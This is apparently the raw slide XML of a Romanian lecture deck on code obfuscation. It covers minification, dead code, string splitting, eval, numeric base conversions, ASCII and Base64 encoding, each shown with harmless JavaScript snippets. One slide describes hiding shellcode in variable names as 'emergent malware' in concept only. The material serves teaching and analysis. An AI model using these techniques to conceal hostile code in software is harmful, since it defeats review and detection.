          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="965241" y="2921230"/>
            <a:ext cx="7995879" cy="1597887"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="965241" y="4728210"/>
            <a:ext cx="7468934" cy="1509360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>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506818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a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0"/>
              <a:t>C.12.6</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Ofruscarea</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4033279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Ofruscarea</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600"/>
              <a:t>emergenta</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Împărțirea unui shellcode în nume de variabile, într-un script</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Alăturarea tuturor variabilelor ne oferă codul shell curat care poate fi scris în binar</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Deci, scriptul este inofensiv, dar, cumulativ, numele variabilelor constitue un malware emergent.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>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1132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Ofruscarea</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600"/>
              <a:t>alte tehnici de ofuscare</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" u="sng">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Minificarea</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> – este procesul de eliminare a tuturor caracterelor inutile din codul sursă fără a schimba funcționalitatea. Aceasta include spațiile albe, liniile noi, comentariile, etc.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Original:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>function adunare(a, b) { return a + b; }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Ofuscat (minificat):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>function adunare(a,b){return a+b;}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>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8691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a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581192" y="2180496"/>
            <a:ext cx="11029615" cy="4329161"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="62500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Inserarea de Atribuiri Complicate</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Folosirea expresiilor sau atribuirilor complicate și neintuitive pentru a realiza operațiuni simple.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Exemplu:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>    Original: let x = 10;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>    Ofuscat: let x = 10; x = (x++ * x-- + x);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Folosirea Codului Mort</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Introducerea de cod care nu va fi executat niciodată (cod mort), pentru a induce în eroare analizatorul sau cititorul.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Exemplu:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>javascript</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>if (false) { console.log("Acest cod nu va fi executat niciodată."); }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>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339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a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581192" y="2071639"/>
            <a:ext cx="11029615" cy="4438018"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Splitarea Stringurilor</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Împărțirea stringurilor în fragmente mai mici care sunt apoi concatenate dinamic în cod.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Exemplu:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>    Original: console.log("Mesaj secret");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>    Ofuscat: console.log("Mes" + "aj " + "secret");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Utilizarea Funcțiilor Generatoare de Cod</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Crearea de funcții care generează și execută dinamic cod prin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>eval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> sau noi instanțe de funcții.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Exemplu:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>const exec = new Function('return 1 + 1;'); console.log(exec()); // Execută codul generat dinamic</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7779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a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581192" y="2028096"/>
            <a:ext cx="11029615" cy="4677504"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="62500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Folosirea Codului Dinamic Executabil</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Executarea codului generat dinamic, de exemplu, prin eval(), pentru a evalua stringuri ca și cod.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Exemplu:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>eval("console.log('execută acest cod');");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Transformări Logice Complexe</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Înlocuirea condițiilor sau a buclelor simple cu variante mult mai complexe și greu de urmărit.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Exemplu:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Original (javascript)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>if (user.isValid) { login(user); }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Ofuscat (javascript)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>user.isValid &amp;&amp; login(user);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>sau chiar folosind logica mai complicată pentru a evalua aceeași condiție.</a:t>
            </a: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11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55676" y="1507670"/>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88257" y="182106"/>
            <a:ext cx="10515600" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Ofruscari</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="918028" y="2482836"/>
            <a:ext cx="10515600" cy="2826204"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Transformările numerice reprezintă o altă categorie interesantă de tehnici de ofuscare, implicând conversia datelor între diferite sisteme de numerație sau formate pentru a ascunde valorile sau logica reală. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Aceste transformări pot face analiza codului mai dificilă, deoarece necesită un pas suplimentar de conversie pentru a înțelege valorile efective utilizate în execuție.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="675442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 - transformari</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581192" y="2180496"/>
            <a:ext cx="11029615" cy="4154990"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Conversia în Hexadecimal</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Convertește valorile în reprezentarea lor hexadecimală. Această metodă este utilă pentru ascunderea stringurilor sau valorilor numerice directe.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Exemplu (javascript):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>    Original: let age = 27;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>    Ofuscat: let age = 0x1B; // 27 în hexadecimal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Conversia din Hexadecimal</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Procesul invers, unde valorile hexadecimale sunt convertite înapoi în valorile lor originale în timpul execuției.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Exemplu (javascript):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>let age = parseInt('0x1B');</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7118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 - transformari</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581192" y="2180496"/>
            <a:ext cx="11029615" cy="4358190"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Conversia în Binar</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Reprezentarea valorilor folosind sistemul binar. Aceasta poate fi folosită pentru a ascunde numerele prin ofuscare.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Exemplu:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>    Original: let flag = true;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>    Ofuscat: let flag = !!0b1; // true, reprezentat ca binar</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Conversia din Binar</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Conversia valorilor binare înapoi în formatul lor original sau utilizabil.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Exemplu:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>javascript</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>let flag = Boolean(0b1); // Converteste din binar în boolean</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784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 - transformari</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472335" y="1911983"/>
            <a:ext cx="11029615" cy="4793618"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Folosirea Codului ASCII</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Folosirea codurilor ASCII pentru a reprezenta caracterele, ascunzând astfel stringurile.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Exemplu:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>    Original: console.log("OK");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>    Ofuscat: console.log(String.fromCharCode(79, 75)); // "OK" folosind codurile ASCII</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Conversia între Baze Numerice</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Utilizarea diferitelor baze numerice (de exemplu, octal, decimal, binar, hexadecimal) pentru a reprezenta valori, complicând înțelegerea imediată a codului.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Exemplu decimal în binary (javascript):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>let num = (10).toString(2); // "1010", reprezentarea binară a numărului 10</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Hexadecimal în decimal (javascript):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>let num = parseInt('A', 16); // 10, conversia valorii hexadecimale 'A' în decimal</a:t>
            </a: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5376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white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ofruscarea</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>alte tehnici de ofuscare - transformari</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581192" y="2180496"/>
            <a:ext cx="11029615" cy="4234818"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="77500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Encodarea Stringurilor</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Utilizarea diferitelor scheme de codare (de exemplu, Base64) pentru a ofusca stringurile.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Exemplu:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>    Original: let secret = "Password";</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>    Ofuscat: let secret = btoa("Password"); // Encodare Base64</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Decodarea Stringurilor</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Decodarea stringurilor codate în timpul execuției pentru a le folosi în logică.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Exemplu (javascript):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>let secret = atob("UGFzc3dvcmQ="); // "Password", decodare din Base64 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>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9952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Ofruscarea</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>exemplu</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>y = “text”.length</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>x = 3+y-7</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>J_dDs = “.|0”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
